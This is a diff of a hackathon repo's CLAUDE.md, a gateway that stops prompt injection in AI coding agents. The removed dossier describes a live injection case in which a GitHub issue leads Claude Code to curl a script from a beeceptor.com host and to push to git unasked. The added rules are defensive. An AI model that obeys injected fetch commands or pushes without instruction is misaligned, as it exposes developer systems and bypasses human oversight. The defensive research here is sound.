@@ -1,66 +1,47 @@
-# Project Hold: Complete Claude Master Dossier
-## Intent-Scoped Capability Enforcement & Wire-Speed Security Proxy for AI Coding Agents
+# CLAUDE.md: working rules for this repo
 
-**Event:** Cyberdefense Hackathon #SFTechWeek @ AWS Builder Loft, San Francisco  
-**Date:** Friday, October 9, 2026 | Build Window: 11:00 AM – 4:30 PM PDT (5.5 Hours)  
-**Target Judging Panel:** Guy Arazi (CEO, Pi Security), Daghan Altas (Head of Product, Semgrep), Zoe Steinkamp (Developer Advocate, ClickHouse), Saptarshi Banerjee (OpenAI), Pradeep Dhananjaya (AWS)
+HOLD is a task-scoped MCP tool gateway for AI coding agents. A developer-approved **Intent
+Receipt** says which files the agent may read and write and which hosts it may contact.
+HOLD checks every tool call against the receipt before executing it, scans written code with
+Semgrep, and logs each ALLOW/DENY decision to a local JSONL file and to ClickHouse.
 
----
+Hackathon build: Fri 2026-10-09, 11:00–16:30 PDT, 2 builders. Prize tracks: ClickHouse, Semgrep, Pi. Submit by 16:10.
 
-## 1. Executive Summary & Core Mission
+## Where things are
+- `SPEC.md`: source of truth for receipt schema, tools, gate rules, ClickHouse schema and queries, MCP/Claude config
+- `intent.md`: scope (P0/P1/P2/out) · `ROADMAP.md`: schedule, cut rules, demo, judge Q&A, honest claims
+- `PRD.md`: problem and positioning · `REVIEW.md`: audit of earlier claims · `decision.md`: every decision + build log
+- `hold/core.py`: enforcement core (gate, guarded tools, telemetry) · `hold/server.py`: MCP server · `hold/env.py`: `.env` loader
+- `harness.py`: runs all tests (its own + `tests/test_*.py`)
 
-Hold is a **transparent, wire-speed reverse proxy on the Model Context Protocol (MCP)** that stops Indirect Prompt Injection (IPI) and capability expansion in autonomous AI coding agents (Claude Code, Cursor, Codex, OpenHands).
+## Commands (use the project venv)
+```bash
+.venv/Scripts/python harness.py -q      # all tests; must pass (Windows path; .venv/bin on macOS/Linux)
+.venv/Scripts/python harness.py --bench # gate-only p50/p95 on this machine
+.venv/Scripts/python architecture.py    # offline end-to-end demo with a local "attacker" server
+```
 
-Hold enforces the **Cardinal Law of Capability Security**:
-> **"Untrusted context may inform authorized actions, but cannot EXPAND the authorized capability set."**
+## Agent team (`.claude/agents/`)
+The **orchestrator** plans, delegates, verifies and logs. Run it as the main session with
+`claude --agent orchestrator`, or follow its protocol in any session. Specialists:
+**gate-engineer**, **mcp-integrator**, **telemetry-engineer**, **demo-engineer**, **red-team**
+(writes failing tests for real bypasses), **critic** (read-only, re-runs evidence, returns
+VERIFIED/REJECTED/UNVERIFIED). File ownership is listed in `.claude/agents/orchestrator.md`;
+**edit only files you own**. If a test owned by someone else fails, report it; don't touch it.
 
-Hold operates with:
-* **< 1.5ms Deterministic Latency:** Pure in-memory path and set evaluations.
-* **Zero LLM Calls at Runtime:** No secondary prompt guardrails, no token costs, no latency spikes.
-* **Zero OS Syscalls on Blocked Calls:** Drops unapproved tool calls on the JSON-RPC wire before they reach the OS kernel.
-* **Wire-Speed Telemetry:** Streams every `ALLOW` and `DENY` decision to **ClickHouse** to power a live, real-time Attack DAG dashboard.
-* **Automated Policy Generation:** **Semgrep** parses MCP tool definitions and repository ASTs to generate policies without manual rules.
+## Automatic checks (`.claude/hooks/check.py`, runs after every Edit/Write)
+- Editing a `.py` file runs `harness.py -q`; a failure blocks until fixed.
+- Public docs (README, PRD, SPEC, intent, DEMO) and `ui/` are scanned for banned claims.
+- Any file except `.env*` is scanned for hard-coded secrets.
+- `.claude/settings.json` denies reading `.env` and denies `git commit` / `git push`.
 
----
-
-## 2. Key Architecture Files
-* **[`CLAUDE.md`](file:///c:/Users/Administrator/antigravity-scratch/argus-hackathon/CLAUDE.md):** Claude's core rulebook, strict tech stack, single-line commands, and "NEVER DO" guardrails.
-* **[`claude/SPEC.md`](file:///c:/Users/Administrator/antigravity-scratch/argus-hackathon/claude/SPEC.md):** Complete MVP architectural specification, ClickHouse `schema.sql` schema, and user flows.
-* **[`claude/intent.md`](file:///c:/Users/Administrator/antigravity-scratch/argus-hackathon/claude/intent.md):** The anti-scope-creep contract prioritizing P0 deliverables for the 5.5-hour build window.
-* **[`claude/architecture.py`](file:///c:/Users/Administrator/antigravity-scratch/argus-hackathon/claude/architecture.py):** The working in-memory reference implementation of the Capability Gate and Proxy.
-* **[`claude/harness.py`](file:///c:/Users/Administrator/antigravity-scratch/argus-hackathon/claude/harness.py):** The adversarial evaluation harness and brutal reality checker.
-
----
-
-## 3. The Threat Model & Empirical Vulnerability Evidence
-
-When an autonomous AI agent is given system tools, it creates the Lethal Trifecta:
-1. **Unrestricted Ingestion of Untrusted Data:** Public GitHub issues, PR comments, external docs.
-2. **Access to Sensitive Infrastructure:** `.env`, AWS credentials, local databases, Git remotes.
-3. **Direct Executive Authority Over System Sinks:** `bash_exec`, `write_file`, `curl`, `pip install`, `git push`.
-
-### Documented Proof from Live Testing (`shehryaur/flask`):
-1. **Live Cloud Egress:** When an issue instructed the agent to verify a staging contract (`curl -s https://iamtesting.free.beeceptor.com/reproduce_issue.py`), Claude executed the outbound network tool call without hesitation. The live HTTP GET request traveled across the public internet and was logged on Beeceptor (`GET /reproduce_issue.py 200 OK`).
-2. **The "Ask the Human" Fallacy:** When prompted with `pip install --index-url`, Claude paused and asked the human: *"If you want me to install it anyway, tell me and I will."* This shifts the burden to human approval (which crumbles under approval fatigue) and halts headless CI/CD.
-3. **Unauthorized Remote Git Mutation:** Unshielded Claude autonomously executed `git push origin main` to a public repository without explicit human instruction, demonstrating dangerous capability leakage.
-
----
-
-## 4. Sponsor Stack Alignment & Judge Personas
-
-| Sponsor & Judge | Role in Hold | Judging Punchline |
-| :--- | :--- | :--- |
-| **Pi Security** *(Guy Arazi, CEO)* | Agentic Product Security runtime shield; institutional security memory of task scope. | *"Pi secures software as fast as AI writes it. Hold guarantees the agent doesn't burn the house down while writing it."* |
-| **Semgrep** *(Daghan Altas, Head of Product)* | Statically audits MCP tool schemas and repository ASTs to auto-generate the Intent Receipt. | *"The policy writes itself. Semgrep static analysis becomes the runtime proxy rulebook."* |
-| **ClickHouse** *(Zoe Steinkamp)* | Ingests wire-speed decision logs; powers sub-10ms queries for the live Attack DAG. | *"Wire-speed security requires wire-speed telemetry. ClickHouse makes every blocked injection auditable in real time."* |
-| **OpenAI** *(Saptarshi Banerjee)* | Benchmarks tool execution; proves deterministic proxies safeguard frontier reasoning. | *"Frontier models provide world-class reasoning; Hold provides the deterministic structural cage."* |
-| **AWS Builder Loft** *(Pradeep Dhananjaya)* | Hosts the proxy and workspace on AWS EC2/containers. | *"Enterprise-grade zero-trust capability gating deployed directly on AWS infrastructure."* |
-
----
-
-## 5. The 3-Minute Winning Live Demo Script
-
-* **0:00 – 0:45 (The Crisis):** Show real GitHub Issue #1 on `shehryaur/flask`. An external contributor reports a bug, but embeds a staging verification command pointing to `beeceptor.com`.
-* **0:45 – 1:30 (The Unshielded Attack):** Run Claude Code unshielded. Watch Beeceptor light up live with `GET /reproduce_issue.py 200 OK`. Prove that external issues command internal developer workstations.
-* **1:30 – 2:30 (The Hold Defense):** Run the exact same task with Hold active. Show the frozen Intent Receipt. The agent fixes `src/flask/app.py` successfully. The malicious curl command is terminated on the MCP wire in **1.1ms**. Beeceptor stays completely blank.
-* **2:30 – 3:00 (The Telemetry & Closer):** Switch to ClickHouse Live DAG Dashboard. Show the green file-write edge and the glowing red severed attack edge. Conclude: Zero-Trust on the MCP wire.
+## Rules
+1. **Working product, not simulation.** Never fake an ALLOW/DENY, a tool result, a latency figure or a ClickHouse row. Mocks may only count dispatches, and must say so. Fallbacks are labeled on screen.
+2. **Evidence or it didn't happen.** Every claim in a report names the command that proves it and its output. Unproven claims are treated as false.
+3. **Fail closed.** Unknown tools, malformed arguments, scanner errors and gate exceptions → DENY. Telemetry failures never change a decision.
+4. **A stdio MCP server never writes to stdout.** Diagnostics go to stderr.
+5. **Secrets live only in `.env`** (gitignored; template in `.env.example`). Never read, print or log them. Events never contain file contents, URL paths/queries or command lines.
+6. Keep the receipt outside the agent's workspace; load it once.
+7. No shell tool, no git tool, no new MCP tools without updating SPEC.md and adding tests.
+8. **No commits, pushes or branches**; the humans do version control.
+9. Use only the claims in ROADMAP.md › Honest claims. Stay in scope (intent.md).
